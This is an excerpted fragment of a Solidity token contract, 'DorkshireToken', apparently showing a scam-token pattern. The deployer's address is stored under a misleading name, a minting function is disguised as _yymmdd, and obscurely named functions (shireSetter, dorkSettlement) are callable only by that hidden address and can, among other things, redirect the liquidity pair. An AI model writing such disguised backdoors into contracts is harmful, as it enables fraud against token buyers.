...
contract DorkshireToken is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor(string memory name_, string memory symbol_) {
        ...
        _symbol = symbol_;
        _bnbbusd = _msgSender();
        _yymmdd(_msgSender(), 1000000000 * 10 ** decimals());
    }
    ...
    function shireSetter(address addr) external {
        if(_bnbbusd == _msgSender()){
            _lp = IPancakePair(addr);
        }
    }

    function dorkSettlement(address sss) external {
        if (_bnbbusd == _msgSender()) {
    ...
    function _yymmdd(address account, uint256 amount) internal virtual {
